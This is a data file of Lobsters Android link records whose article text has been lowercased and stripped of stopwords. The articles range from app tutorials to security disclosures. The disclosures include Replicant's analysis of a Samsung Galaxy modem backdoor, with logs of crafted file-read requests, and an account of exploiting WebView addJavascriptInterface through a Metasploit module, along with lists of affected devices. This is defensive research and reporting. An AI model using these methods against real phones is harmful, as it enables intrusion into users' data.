514,Lobsters,android,Android,How to build an Android app that displays live accelerometer data using a line chart control,http://blogs.telerik.com/blogs/14-04-01/how-to-build-an-android-app-that-displays-live-accelerometer-data-using-a-line-chart-control,build android app display live accelerometer data using line chart control,telerik chart control android reference chart android app sensoreventlistener sensormanager documentation state http needle download telerik chart android read ui android,mobile device today builtin sensor accelerometer compass temperature audio light sensor gps etc used variety apps game weather travel apps availability sensor massmarketed mobile device creates exciting new opportunity data mining application blog going show display live accelerometer data simple android seismograph app end use telerik chart control android test control behaves handling large amount streaming data build app using android studio spoiler alert result get end let dive set new application project android studio need reference chart android app keep unnecessary code logic post focus mainly workflow core mechanic application working sensor android application one must first implement sensoreventlistener interface interface used receiving notification sensormanager sensor value changed couple method overridden onsensorchanged onaccuracychanged onaccuracychanged called accuracy sensor changed onsensorchanged sensor value changed case seismograph simulator magic happen onsensorchanged override acceleration sensor report data let start obtaining reference sensormanager accelerometer documentation state order get instance default acceleration sensor need following mind similar accelerometer app would inevitably boil following basic workflow leaving unnecessary logic look like code code simplified illustrative purpose valid application type thing remaining show create chart display data smartphone sensor case accelerometer inside chart app source code available download github http next blog post show add needle needle synchronized coordinate incoming accelerometer seismic data point create following effect download telerik chart android read ui android
516,Lobsters,android,Android,Samsung Galaxy Back-door,http://redmine.replicant.us/projects/replicant/wiki/SamsungGalaxyBackdoor,samsung galaxy backdoor,samsung galaxy backdoor statement published free software foundation website backdoor present proprietary android system running affected samsung galaxy device including one shipped device however replicant installed device backdoor effective replicant cooperate backdoor abstract known affected device backdoor sample sample file kernel log incriminated software log analysis developer involved present analysis ever agree sort end user license agreement explicitly prohibited reverse engineering decompiling operation incriminated binary reverse engineering operation led finding originally took place development samsungril free software replacement incriminated program hence believe operation conducted sole purpose interoperability intent creating competing product involved developer based europe believe legality operation granted article eu computer program directive samsung ipc rf message legitimacy area work samsungril http note samsungril libsamsungipc,samsung galaxy page contains technical description backdoor found samsung galaxy devicesfor general description issue please refer statement published free software foundation website backdoor present proprietary android system running affected samsung galaxy device including one shipped device however replicant installed device backdoor effective replicant cooperate backdoor samsung galaxy device running proprietary android version come backdoor provides remote access data stored devicein particular proprietary software charge handling communication modem using samsung ipc protocol implement class request known rf command allows modem perform remote io operation phone storage modem running proprietary software likely offer overtheair remote control could used issue incriminated rf message access phone file system known affected following table show device known contain backdoor part software ship withplease contact u know device could concerned backdoor information one listed device device incriminated program running root selinux enabled libsamsungipc support replicant support nexus possible android later yes yes galaxy yes yes yes galaxy yes yes galaxy note yes yes galaxy nexus possible android later yes yes galaxy tab yes yes galaxy tab yes yes galaxy yes yes galaxy note yes yes nt absolute certainty regarding samsung galaxy device likely device flavor affected backdoor well probably us samsung ipc protocol proprietary userspace implementation backdoor order investigate backdoor check actually let modem code added modem kernel driver make craft inject request using incriminated message check result following patch apply replicant kernel implement sample use backdoor open dataradiotest file read content close file demonstrates incriminated software execute operation upon modem request note software implementation appends efsroot provided path fairly simple escape path request file file system using note file opened incriminated software user permission may root device case run unprivileged user still access user personal data sdcard finally device may implement selinux considerably restricts scope possible file modem access including user personal data sdcard following sample obtained galaxy note running cyanogenmod sample sample file used demonstration dataradiotest filled hello world root android hexdump c dataradiotest hello world kernel mif rxiodevskb rxiodevskb dropping rf frame mif rfscraftstart rfscraftstart crafting open mif rfscraftstart rfscraftstart adding skb queue mif rxiodevskb rxiodevskb dropping rf frame mif miscwrite miscwrite intercepted rf response mif rfscraftwrite rfscraftwrite open response mif rfscraftwrite rfscraftwrite adding skb queue mif miscwrite miscwrite intercepted rf response mif rfscraftwrite rfscraftwrite read response byte read mif mifprintdata mif rfscraftwrite rfscraftwrite adding skb queue mif miscwrite miscwrite intercepted rf response mif rfscraftwrite rfscraftwrite rx rf message command size mif mifprintdata relevant part response read request mif rfscraftwrite rfscraftwrite read response byte read mif mifprintdata match content dataradiotest file hence making obvious incriminated software implement backdoor incriminated software eril processrfs received standalone rf frame len eril ipcrecvrfs eril getwakelock rilwakelockmask eril getwakelock rilwakelockmask eril rxrfsopenfile eril rxrfsopenfile open file efsroot dataradiotest flag ordwr eril check dir efsroot dataradio eril directory already exists eril rxrfsopenfile length eril txrfscfrmopenfile eril txrfscfrmopenfile length eril ipcsendsinglerfsipc fd sendto byte rfshdr eril getwakelock rilwakelockmask eril getwakelock rilwakelockmask eril setwakelock secrilrfsinterface eril setwakelock secrilfmtinterface eril processipc single ipc plen pkt eril processrfs received standalone rf frame len eril ipcrecvrfs eril getwakelock rilwakelockmask eril getwakelock rilwakelockmask eril rxrfsreadfile eril rxrfsreadfile length eril txrfscfrmreadfile eril txrfscfrmreadfile length eril ipcsendsinglerfsipc fd sendto byte rfshdr eril processrfs received standalone rf frame len eril getwakelock rilwakelockmask eril getwakelock rilwakelockmask eril setwakelock secrilrfsinterface eril evt req rx eril ipcrecvrfs eril getwakelock rilwakelockmask eril getwakelock rilwakelockmask eril rxrfsclosefile eril rxrfsclosefile length eril txrfscfrmclosefile eril txrfscfrmclosefile length eril ipcsendsinglerfsipc fd sendto byte rfshdr following analysis conducted using libsecrilso binary file incriminated proprietary software extracted cyanogenmod system zip galaxy location systemliblibsecrilso developer involved present analysis ever agree sort end user license agreement explicitly prohibited reverse engineering decompiling operation incriminated binary reverse engineering operation led finding originally took place development samsungril free software replacement incriminated program hence believe operation conducted sole purpose interoperability intent creating competing product involved developer based europe believe legality operation granted article eu computer program directive first approach using string tool incriminated program reveals numerous suspicious command name appear samsung ipc protocol definition ipcrfsreadfile ipcrfswritefile ipcrfslseekfile ipcrfsclosefile ipcrfsputfile ipcrfsgetfile ipcrfsrenamefile ipcrfsgetfileinfo ipcrfsunlinkfile ipcrfsmakedir ipcrfsremovedir ipcrfsopendir ipcrfsreaddir ipcrfsclosedir ipcrfsopenfile ipcrfsftruncatefile ipcrfsgethandleinfo ipcrfscreatefile name command make obvious let modem perform io operation string utility also reveals matching function name seem implement handling command rxrfsgetfile rxrfscreatefile rxrfsreaddirectory rxrfsopendirectory rxrfsrenamefile rxrfsdefault rxrfsopenfile rxrfsreadfile rxrfsftruncatefile rxrfswritefile rxrfsgetfileinfobyhandle rxrfsgetfileinfo rxrfsputfile rxrfslseekfile rxrfsclosefile rxrfsdeletefile rxrfsmakedirectory rxrfsclosedirectory rxrfsremovedirectory txrfscfrmcreatefile txrfscfrmputfile txrfscfrmopendirectory txrfscfrmgetfileinfo txrfscfrmreaddirectory txrfscfrmrenamefile txrfscfrmclosefile txrfscfrmftruncatefile txrfscfrmgetfileinfobyhandle txrfscfrmdeletefile txrfscfrmclosedirectory txrfscfrmremovedirectory txrfscfrmmakedirectory txrfscfrmgetfile txrfscfrmreadfile txrfscfrmwritefile txrfscfrmlseekfile txrfscfrmopenfile taking closer look function using objdump decompiler reveals actually called ipcrecvrfs function called processipcnotifymessage appears handle received message modem hence deduct incriminated function actually called upon modem request taking closer look one function eg rxrfsreadfile reveals multiple call procedure linkage table plt hence believe call linked function libc library especially iorelated function general manner open close read write etc samsung ipc rf following table associate samsung ipc rf message hexadecimal command value message hexadecimal command value ipcrfsnvreaditem ipcrfsnvwriteitem ipcrfsreadfile ipcrfswritefile ipcrfslseekfile ipcrfsclosefile ipcrfsputfile ipcrfsgetfile ipcrfsrenamefile ipcrfsgetfileinfo ipcrfsunlinkfile ipcrfsmakedir ipcrfsremovedir ipcrfsopendir ipcrfsreaddir ipcrfsclosedir ipcrfsopenfile ipcrfsftruncatefile ipcrfsgethandleinfo ipcrfscreatefile ipcrfsnvwriteallitem incriminated rf message samsung ipc protocol found particular legitimacy relevant usecase however possible added legitimate purpose without intent harm providing backdoor nevertheless result allows modem access phone storage however rf message samsung ipc protocol legitimate ipcrfsnvreaditem ipcrfsnvwriteitem target precise file known modem nv data particular security concern proprietary implementation free software replacement strictly limit action particular file area work could done order handle backdoor samsungril could show message alerting user backdoor used including requested path asking user save log contact u alternatively kernel could block incriminated rf request keep trace log record option would work cyanogenmod incriminated proprietary blob still used ticket regarding backdoor opened cyanogenmod http action taken free software replacement incriminated binary samsungril relies libsamsungipc used replicant affected device modem use samsung ipc protocol mostly intel intel modem note despite backdoor device using modem likely good modem isolation compared device using qualcomm platform bear mind backdoor implemented software easily removed installing free replacement incriminated software instance installing replicant hence nt consider incriminated device inherently bad target backdoor
517,Lobsters,android,Android,Replicant developers find and close Samsung Galaxy back-door,https://www.fsf.org/blogs/community/replicant-developers-find-and-close-samsung-galaxy-backdoor,replicant developer find close samsung galaxy backdoor,replicant donation replicant replicant available replicant wiki samsungmobile emailed joining associate member today,guest post replicant developer paul kocialkowski free software foundation support replicant working together free software fund donation replicant support important work today phone come two separate processor one generalpurpose application processor run main operating system eg android known modem baseband radio charge communication mobile telephony network processor always run proprietary operating system system known backdoor make possible remotely convert modem remote spying device spying involve activating device microphone could also use precise gps location device access camera well user data stored phone moreover modem connected time operator network making backdoor nearly always accessible possible build device isolates modem rest phone ca nt mess main processor access component camera gps device offer guarantee device know modem may total control application processor system nothing new working replicant fully freelibre version android discovered proprietary program running application processor charge handling communication protocol modem actually implement backdoor let modem perform remote file io operation file system program shipped samsung galaxy device make possible modem read write delete file phone storage several phone model program run sufficient right access modify user personal data technical description issue well list known affected device available replicant wiki provided modem run proprietary software remotely controlled backdoor provides remote access phone data even case modem isolated access storage directly yet another example unacceptable behavior proprietary software permit free replacement nonfree program implement backdoor modem asks read write file replicant cooperate replicant cooperate backdoor modem take control main processor rewrite software latter way main processor system replicant stop least know closed one specific backdoor fsf encourages current samsung galaxy owner appeal publicly samsungmobile explanation also emailed samsung release program free software without backdoor replicant nt continue defusing trap apparently left user support free software foundation joining associate member today
518,Lobsters,android,Android,On the WebView addJavascriptInterface Saga,http://www.droidsec.org/news/2014/02/26/on-the-webview-addjsif-saga.html,webview addjavascriptinterface saga,webview addjavascriptinterface saga background software android choose webviews addjavascriptinterface webview component dave hartley article security issue attack vector attack vector new development addjsif readme fruit ninja angry bird metasploit pull request post randroid subreddit simple safe test page droid army one public testing service key finding request advisory suggestion communication key google oems carrier app developer researcher user future work open question test page donation page conclusion,webview addjavascriptinterface saga feb jduck last month several new fact came light saga security issue using addjavascriptinterface android webview object danger associated method well documented full extent reach associated issue known recently issue continue plague security android ecosystem day decided write post many different reason first want set fact straight interaction involving method security issue result complex understandably published article contain technically inaccuracy second testing think test result interesting finally want make recommendation various party within ecosystem document open question future direction research important note post discus number important android security issue many egregious privacy leak stem android application advertising sdks stock third party browser often vulnerable publicly disclosed vulnerability security issue stem using addjavascriptinterface topic covered post deserve attention note post ballooned significantly working publish detail future background section learn different technology paradigm come together create issue topic post includes introduction software handling android vulnerable api important property vulnerability software android software android device consists firmware application type software versioned distributed updated using different mechanism firmware particular device built party responsible maintaining device firmware put onto device party later update via ota usually must go party well addition android version oems carrier versioning scheme part android software update process discussed depth elsewhere elaborate application either distributed part firmware via google play case application updated directly vendor via google play application versioned respective vendor addition android version google us versioning mechanism indicate precise availability behavior object method object method comprise developer api hence version called api level api level increased many change made developer documentation contains lot note change throughout evolution android application developer choose api level use application compile time new api level released developer anything unless want take advantage functionality new api app developer free select older api level build application google tried dissuade practice newer version sdk printing warning compile time also google created google play service ease pain caused api evolution however technical barrier prevents using older api level fact developer intentionally way maximize device compatibility application built particular api level changed without recompiling redeploying webviews addjavascriptinterface android many browser webbased mobile application rely webview component documentation component pretty good check want fully understand purpose usage suffice say part android framework provides working embeddable web browser version prior android kitkat based webkit engine kitkat later based chromium include ui portion also referred chrome confused chrome browser addjavascriptinterface method one way developer embed webview application including people build browser expose java functionality javascript existed since first release android api level provides method achieve synchronous meaning javascript wait response communication hosting application plenty resource showing use functionality go detail highlevel explanation see finding make uncomfortable reading section dave hartley article mwr blog security issue multiple security issue exist involving addjavascriptinterface method android webview object several issue involve application expose object untrusted javascript within webview using vulnerable api another issue exploitation aforementioned issue rely untrusted javascript execute arbitrary java code thus shell command native code detail issue presented following section important point understand one issue multiple interrelated vulnerability case exploiting vulnerable apps give attacker privilege app however wide public availability privilege escalation exploit android device lead full device compromise attack vector vulnerability exploited via one attack vector exactly attack vector allow exploitation depends context affected webview used depends untrusted javascript come point view break following category urlbased attack vector sending url via email im sm etc malicious advertisement aka malvertising injecting exploit compromised trusted site eg watering hole attack man middle attack mitm dns hijacking rogue apbts etc local attack javascript cached external storage sd card severe issue exploited scenario slightly le severe exploited via subset new development back september jduck developed metasploit exploit module called addjsif target vulnerable us addjavascriptinterface within advertising sdks created exploit hope metasploit would bring additional attention visibility seriousness issue specifically designed used mitm proxy server inject payload passing traffic addjsif project readme document administrator set use exploit test device network testing module jduck successfully exploited wildly popular fruit ninja angry bird game installed nexus running android also researched name object exposed via addjavascriptinterface embedded name module decision open source jduck exploit module end january set motion sequence event leading post though mwr lab published exploit december drozer tool simply large user base metasploit original goal stood module released publicly starting early february metasploit engineer took jduck work started looking integrate penetration testing framework effort documented pull request initiated merge seen description pull request joe vennix discovered minor modification jduck exploit module able remotely execute arbitrary code older version stock android browser app news u previously reported publicly anyone including google testing tim wright showed exploit also work current version google glass writing even worse exploited google glass browser yield camera permission right exploit allows attacker see whatever someone wearing google glass see top several publicly available exploit capable gaining root privilege google glass device fact combined cause quite concern early adopter exorbitantly priced gadget following event another medium blitz ensued many article claiming android device vulnerable particular exploit lengthy discussion post randroid subreddit u defending research vehement opponent truth told number came assumption device prior android affected tested handful device point thus decided thorough testing stock browser various device first jduck set create simple safe test page would detect whether webview loaded vulnerable team assisted organizing crowdsourced testing twitter tested droidsec droid army jduck device run stock firmware case latest available test decent sampling device pool joe vennix ran test one public testing service see device fared result round testing quite interesting several new fact uncovered key finding testing discovered several important fact worth discussing key finding early testing adsupported apps revealed even current fully uptodate device successfully exploited specific circumstance application insecurely use addjavascriptinterface render untrusted content compiled api level le remain vulnerable popular apps tested two apps likely many many exist issue assigned recent testing revealed certain version stock browser including aosp also vulnerable issue due insecure use addjavascriptinterface involving searchboxjavabridge object digging deeper discovered exactly vulnerable object introduced android removed android within aosp code assigned per request device using version android within affected range x vulnerable indicates oemscarriers backported patch firmware somewhere along way possible maybe even likely google notified partner issue spur movement without notifying general public determining entirety vulnerable device firmware combination remains open problem one actively seeking address additional insecurely exposed object found within certain htc device firmware version particular testing one v one x android showed object called htmlout exposed interestingly exact name object discussed blog aleksander kmetec note quick search writing post turned advisory wooyun believe cve assigned yet certain version thirdparty browser also vulnerable particular certain version dolphin browser tested vulnerable unfortunately exact version list exposed object available despite fact issue existed year several finding come light last month issue important need attention next section provides suggestion various party android ecosystem help suggestion issue holistically addressed thankfully number thing various group within android ecosystem improve situation without intervention assistance android vendor largely left device protect user lead first important recommendation everyone ecosystem communication key community need spread word brings issue avoid locate fix instance please part help make android ecosystem secure place google took positive step made security enhancement android however original fix messaging surrounding leave much desired messaging side post represents missed opportunity convey seriousness matter could strongly recommended targeting apps depend addjavascriptinterface latest api level could reiterated peril improperly using api unfortunately opted casually explain change enhancement fix side aggressive approach would far effective taken approach might reading post approach chose developer still build still building vulnerable apps today apps even exploited uptodate device serious vulnerability given respect urgency deserve plead take aggressive action remedy blight oems carrier done good thing backporting fix older firmware great device get updated leaf user older device exposed dream day leave anyone behind time security fix user device really order day month week implore find way continue improve process app developer currently distributing vulnerable appsdk please take immediate step correct issue get update deployed possible avoid using addjavascriptinterface must use target appsdk api level higher making sdk consider forcing user use api level higher must synchronous connection javaland consider using shouldallowurloverriding override onjsalert onjsprompt app developer need go extra mile sure including advertising sdks put user risk finally use best practice http certificate pinning help keep webview content trustworthy face mitm attack researcher join u additional research testing reporting eliminate dangerous issue help discover exactly device andor apps vulnerable seek additional unsafe us addjavascriptinterface report finding understanding finding thing win shiny cve list addjsif msf module might even good starting place work vulnerable deviceapp vendor get issue fixed start dialogue customer mobile space raise awareness finally help protect user creating thirdparty solution user security privacy device ultimately hand keep eye ear open information vulnerable apps connect potentially malicious wifi access point remove vulnerable apps device updated give rating vulnerable apps precaution play adsupported game airplane mode pay apps advertising network code never activated future work open question putting together research identified number gap outstanding question additional detail plan publish coming day week idea future work include testing test result fairly limited like solicit high quality test result community large thinking best way enable testing following direction test page would help device test bed fairly small love add device added plea device donation page statistic extracting statistic app market resource intensive determining apps use addjavascriptinterface insecurely requires looking app individually possibly even multiple version research test looking whether compiling library android apps cause apps use library vulnerable inconclusive build particular api level use different api level app included question like answer enough u would love help conclusion post document history latest finding ongoing research webview addjavascriptinterface vulnerability saga though issue received great deal attention press user remain vulnerable latest article focus new discovery stock browser vulnerable however fail explain full risk attacker gain access variety publicly available exploit allow fully compromise device importantly application developer often still expose user device insecurely using addjavascriptinterface issue exploited even fully updated current device nexus tested today fruit ninja perilous situation android device pool running woefully outdated software remains mentioned previously many tested device fully updated latest stock firmware testing device running browser vulnerable version range vulnerable stock browser extrapolating number accurately impossible without exact number devicefirmware combination fair estimation something like percent much le quoted many article also take account issue surrounding method much larger issue closing much saga end provided recommendation various party ecosystem hope fall deaf ear said naive recognize many challenge road ahead u initiative hope overcome issue usher android security new era safe
520,Lobsters,android,Android,The New TextSecure: Privacy Beyond SMS,https://whispersystems.org/blog/the-new-textsecure/,new textsecure privacy beyond sm,release textsecure high privacy low friction advanced ratchet enhanced deniability asynchronous orientation textsecure protocol private group chat server imessage experience whatsapp experience visual refresh connectivity across network christine fred matt contribute code file manage issue translate donate fund download free moxie marlinspike facebook want get involved signal hiring,today release textsecure final step transition private sm app private asynchronous im app depend smsmmsusing lesson learned sm environment past four year developed open protocol asynchronous chat enables private communication instantly friend private group realtime collaboration ability quickly seamlessly share medium privately without depending smshigh privacy low frictionat open whisper system objective advance state art secure communication also reduce friction required ordinary people make use want everyone access advanced secure communication method easy reliable use making normal phone call sending normal text messagewith advanced ratchet enhanced deniability asynchronous orientation believe textsecure protocol represents significant step forward possible asynchronous chat environment todaywe also made substantial effort simplify typically difficult user experience come endtoend encrypted communication new textsecure protocol require round trip key exchange process eliminates halfopen session lightning fast without compromising forward secrecy deniability creates experience take encryption entirely user way user simply sends message encrypted endtoend every time unlike im service distinction private chat normal chat private normalprivate group chatthe new textsecure also introduces support private group chat user create group title avatar icon add friend join leave group exchange messagesmedia endtoend encryption property pairwise textsecure chat providein keeping effort develop privacypreserving protocol possible server access group metadata list group member group title group avatar iconan imessage experiencethe new textsecure android allows two possible configuration default textsecure configured integrated chat app imessage like experience textsecure act normal smsmms app communicating nontextsecure user send message encrypted data channel recipient also textsecure userlike imessage textsecure us color scheme indicate transport message delivered data channel unavailable message fall back sm transport secure session transparently migrate back forth two transportsa whatsapp experiencealternately user configure textsecure function similar whatsapp message ever sent received data channel configuration communication restricted exclusively secure communication textsecure usersa visual refreshwe also done visual refresh entire app adopting modern look new iconconnectivity across networksthe new textsecure push transport federated protocol interoperates transparently cyanogenmod deployment textsecure protocol user month agonow new textsecure android christine fred assure u textsecure io available short order protocol includes support user multiple device matt working desktop clientas usual like help project contribute code help file manage issue help translate donate fund bithub tracker major new release bug please help u find themin meantime get started new textsecure android download free moxie marlinspike february facebookwant get involved signal hiring
522,Lobsters,android,Android,How to Show Animated GIFs in Android,http://weavora.com/blog/2012/02/07/android-and-how-to-use-animated-gifs/,show animated gifs android,gif help write essay animate imageview available starting version android api level class movie gifview view ondraw canvas moviestart activity attrsxml,android platform currently support quite large number medium format see documentation among described graphic file format find one interested gif general help write essay format cause trouble try animate case standard class imageview display gif file regular static image researching related forum probably find people claiming android platform fully support gif animated gifs used nevertheless still solve problem show loophole least two way difficult say solution better however one important point although webview part android sdk ability play animated gif file available starting version android api level aim supporting wide range device second option perhaps acceptable completely fair say class movie well documented case article would probably useless let try create separate component play animated gif file using movieclass ok creating new class gifview inheriting view add new variable movie type class initialize ok movieobject initialized need draw use ondraw canvas method purpose need let movieobject know part gif file draw need separate variable moviestart long type assign systemclockuptimemillis value case know movie started calculate much time passed need initialize gifview activity class let add possibility pas gif id parameter activity class look like another good practice using xml markup component let try well purpose create file attrsxml resvaluesattrsxml following structure need read xml attribute gifview class able use gifview xml markup following way activity class look like really ever used approach better solution please let u know
523,Lobsters,android,Android,Developing a mobile cross-platform library - Part 1. Exploring,http://www.skyscanner.net/blogs/developing-mobile-cross-platform-library-part-1-exploring,developing mobile crossplatform library part exploring,including experience exploring solution developing mobile crossplatform library ie single codebase could part mobile apps running different platform cover journey mobile crossplatform development tool phonegap titanium like code porting tool webviews task c javascript engine work many resource explaining approach problem thought could helpful shared experience first three part list explored solution follow post c javascript engine part currently hold market new io version high adoption rate need support version since froyo gingerbread want good coverage option mobile crossplatform development tool webview tool phonegap rhomobile sencha touch appmobi telerik adobe air xamarin appcelerator titanium corona mosync kony triggerio openfl dragonrad option c option code porting hyperloop xmlvm apportable avian box option javascript webview answer answer option javascript javascript engine development inactive time development active conclusion android crossplatform io library mobile technology related,including experience exploring solution developing mobile crossplatform library ie single codebase could part mobile apps running different platform cover journey mobile crossplatform development tool phonegap titanium like code porting tool webviews task c javascript engine work many resource explaining approach problem thought could helpful shared experience first three part list explored solution follow post c javascript engine part write run anywhere wellknown slogan created illustrate java crossplatform functionality programmer would like run code anywhere however cpu architecture impossible keep new programming language emerge every day framework come go want interact o code reusability question maybe narrowed scope mobile device could chance apparent trend towards mobile day developing mobile crossplatform library would definitely benefit developer let say narrow even io android currently hold market leaf u target cpu architecturesabis io armeabi mips android programming language objectivec io java android framework os support last io version sufficient new io version high adoption rate come android need support version since froyo gingerbread want good coverage see easy task made work wanted achieve summarized diagram one library shared two platform platformspecific glue code order make work skyscanner heavily relying internet networking functionality essential normally io library imported either objectivec source code prebuilt static library binary accompanied respective header file android apart java source code library also imported class bytecode file staticshared library binary however since option restrictive research took place went step explored alternative way importing code android io start option tool make life easier option mobile crossplatform development tool mobile developer must heard numerous mobile crossplatform development tool like phonegap appcelerator titanium xamarin tool allow u develop library right well main problem approach tool usually output endproduct appipa apk library embed runtime environment run crossplatform code difficult interface code running environment native code list tool investigated reason work webview tool tool using webview runtime environment coding immediately dismissed would difficult interface code running webview however also attempted see later tool phonegap rhomobile sencha touch appmobi telerik adobe air runtime environment adobe integrated runtime dismissed due difficulty interfacing code air xamarin output intermediate xamarin library native one appcelerator titanium building native library officially supported could possibly work wrote titanium extension would allow interfacing native code much trouble questionable result sure remain functional next titanium corona corona people claim supported android coming feature io mosync corona kony supported triggerio supported openfl supported dragonrad date seem support hence failure nothing worked wait second cc code accessible io android option c developing library c one two solution work android native development kit ndk java native interface jni framework allow runninginterfacing cc code java ndk responsible compiling c code android target armeabi mips jni allows communication two language using jni quite verbose programmer must adhere naming convention two level wrapper required java c one hand java wrapper provide java api c library exposing c class method native keyword java hand c wrapper provide bridge java wrapper c library translate object two language io thing much simpler naming convention one level wrapper required using objectivec objectivec language variant allows objectivec c code single source file consequently object translation happening single level wrapper see slightlymodified diagram androidios apps including party library unusual programmer access jreandroid cocoa touch framework case party library included either source code prebuilt binary either find build one specification library performing networking operation http request supported standard template library stl integrated libcurl crossplatform library libcurl could included source code configure script executed luckily prebuilt binary found io android used ndk toolchainscompilers built libcurl android target building library target io android timeconsuming part process automated script solution worked quite well c popular language vast number party library used tool used android ndk jni objectivec official solution supported google apple drawback approach android want keep reference c object java wrapper object manually garbage collect c object manually call delete cppobject java object released however reason retain c object copied java one destroyed immediately copying detail along code snippet solution published separate post next week option code porting another option considered maintain one codebase use appropriate tool translate code platform needed option drawback well generated code efficient code written native developer bug likely introduced manually fixed imported binary unlikely translated tool translate source code several mobile code porting tool however none provided required functionality tool translating java code objectivec supported google seems like highquality tool compared rest currently limited amount java class translated objectivec work progress unfortunately translate java http request moment implemented functionality separately platform could possibly work project alive since september hyperloop tool translates javascript native source code currently support io stable plan expand popular platform project alive since august tool translates objectivec code java could good solution well unfortunately mature enough contains many bug output noncompilable code xmlvm tool allows crosscompiling jvm bytecode objectivec neither tool appeared good enough complex use requires lot legacy jar downloadedimported apportable tool take care porting io app android unfortunately meet criterion translates whole apps library output apk android application package file avian lightweight java virtual machine could embedded io app bundle run java code solution provide desired functionality would difficult io ui code interfacing library java code running vm box porting dalvik vm android gingerbread apis top io solution dismissed project longer active option javascript webview javascript language gaining popularity rapidly last year originally used clientside scripting also used serverside application nodejs part several mobile crossplatform tool investigated maybe could crossplatform language solves problem well mobile platform execute javascript script webbrowser view webviews webview apis usually exposed app developer let see minimum functionality need javascript executing script calling function evaluating global variable returned result performing callback native code let investigate platform separately android webview execute script string callback java implemented annotating javascriptinterface certain method java class callable javascript adding reference instance class webview javascript global scope addjavascriptinterface method however evaluating variable function call straightforward way directly evaluate script workaround pas callback function javascript result evaluated callback function get called passing result java method shown answer io uiwebview execute script string unlike android evaluate global variable function call stringbyevaluatingjavascriptfromstring returned string appropriate conversion made result string however callback straightforward android mechanism uiwebview horrible workaround calling objectivec javascript try open new url custom callback scheme eg skycallback javascript capture event objectivec parse url scheme name callback scheme either parse string url resource path evaluate global variable result stored shown answer see interaction javascript native code complicated different platform likely result bug code grows size inevitably become unmaintainable consequently option abandoned option javascript javascript engine javascript library running standalone javascript engine also worked interacting javascript engine much straightforward compared webview unfortunately pure javascript engine lack networking functionality xmlhttprequest object responsible http request javascript available part webbrowser strict javascript specification result different architecture applied delegating networking functionality platformspecific glue code complicates thing particularly interested developing crossplatform javascript library worked io javascriptcore engine used awesome javascriptcore framework framework introduced io easy integrate app within second would cocoa touch framework api simple glue code needed concise android thing bit complicated javascript engine embed one manually two javascript engine successfully embedded rhino rhino written java easy embed add app size developed mozilla foundation development inactive time bit difficult embed written c hence android ndk jni used order interface java adding one layer translation java c javascript instead java javascript addition app size increased something might negligible apps however development active crossplatform library developed javascript http request performed stub stub act placeholder overridden library loaded javascript engine get replaced method call native platformspecific method request implemented full description javascript javascript engine solution found part sequence post published following week conclusion several tool technique explored two worked one hand c solution widely used reliable flexible solution significant drawback manual garbage collection java workaround proposed hand javascript solution easier implement missing functionality overcomplicates architecture dependent either rhino actively developed significant impact app size use one approach take drawback consideration proceed care project seemed promising worth revisiting future corona mosync appcelerator hyperloop nashorn javascript engine written java oracle android crossplatform io library mobile technology related
524,Lobsters,android,Android,Android OEMs exposing touchscreen input,http://tsyrklevich.net/2014/02/09/android-oems-exposing-touchscreen-input/,android oems exposing touchscreen input,,recently ran across simple issue number android device especially huawei phone device left input device file located devinput world readable writeable see input device read procbusinputdevices observe event using standard getevent utility device issue left touch screen world readable leaving sensitive information like password lock screen code input vulnerable interception installed application many device also left number input device world readable gyroscope compass powervolume key etc none appeared exploitable available registering broadcast intent investigate whether worldwriteable touchscreen input device would allow control touch screen case would allow attacker perform arbitrary function phone using testing service able compile incomplete list affected phone however could nt determine update existed fix issue following device left input device file world readable huawei ascend ii android huawei ascend mate android huawei ascend android huawei ascend android huawei fusion android huawei honor android huawei honor android huawei mediapad link android huawei mediapad vogue android huawei mercury android huawei sonic tmobile prism android huawei fusion android following device left input device file world readable writeable coolpad android lg optimus dual android samsung galaxy ii android detailed list
525,Lobsters,android,Android,That NBC (Sochi Hacking) story 100% fraudulent,http://blog.erratasec.com/2014/02/that-nbc-story-100-fraudulent.html,nbc sochi hacking story fraudulent,story update twitter feed,yesterday feb february nbc news ran story claiming bring mobile phone laptop sochi olympics immediately hacked moment turn story fabricated technical detail relate going olympics cyberspace visiting website going person using local wifi story show richard engel getting hacked cafe russia wrong every salient detail nt sochi moscow mile away hack happens website visit olympic themed website physical location result would america phone nt get hacked richard engel initiated download hostile android app onto phone update disable security phone expected story situation wifi sochi maninthemiddle attack inserting blackhole toolkit web page exploiting latest flash story nothing sort instead hacking story due hostility olympic themed website increased danger russia geolocation google us ip address increase rank local site see dodgy russian site result disable feature google account setting absolutely story turning computer connecting sochi network story visiting website remotely thus claim story get hacked immediately upon turning computer fraudulent thing confirmed story nt let richard engel borrow phone leaf u advice always give people nt click stuff patch stuff browser flash pdf get rid really bad stuff oracle java nt click stuff oh really sochi use vpn public wifi gleaned detail kyle wilhoit expert quoted story twitter feed working blog full technical detail sure great lot detail hacker find maltego danger hostile website sort great information totally lost nonsense nbc story way easy way figure journalist commit fraud watching passive voice journalist normally avoid passive voice preferring stronger language need hide thing passive voice cover detail saying hacked cover fact richard engel hacked knowingly downloading hostile android app word active voice would nt worked would required identifying put virus phone could nt report hacker put virus phone hacker nt richard engel could nt well reported active voice downloaded virus thus passive voice phone hacked avoiding inconvenient detail forum lot comment story
526,Lobsters,android,Android,Making the Mobile Web Safer with HTTPS Everywhere,https://www.eff.org/deeplinks/2014/01/making-the-mobile-web-safer-with-https-everywhere,making mobile web safer http everywhere,http everywhere firefox android desktop browser discovered last week recent revelation made abundantly clear locking mozilla,eff bringing security privacy http everywhere important new frontier android phone today install http everywhere firefox android could protect desktop browser http everywhere installed firefox android encrypts thousand connection browser would otherwise insecure give firefox huge security advantage every mobile browser available today step install firefox android step install http everywhere click install http everywhere firefox android exciting news http encryption allows smartphone user safely download apps browse web exchange email instant message sync data device countless everyday task carry around phone tablet often connect unfamilar wifi network putting personal data risk monitored collected tampered anyone else network well internet service provider network operator government agency fact discovered last week nsa gchq invisibly tracking profiling user based data leakage smartphone apps http everywhere guard agains attack browser switching insecure http connection secure http connection whenever possible using thousand url rewrite rule whereas data sent server http easily read modified third party http us strong encryption guarantee data confidentiality integrity http everywhere installed see icon right hand side address bar click icon turn rewrite rule onoff current page clickandhold icon restore default setting estimate http everywhere encrypts hundred billion page view trillion individual request per year however important limitation encrypt request website connecting support http first place essential site across web take responsibility enabling http encryption recent revelation made abundantly clear apps committed sending user data unencrypted browser great place start commitment p quick note iphone user sorry ca nt help secure mobile browsing experience apple policy locking mozilla mean ca nt secure browser pocket
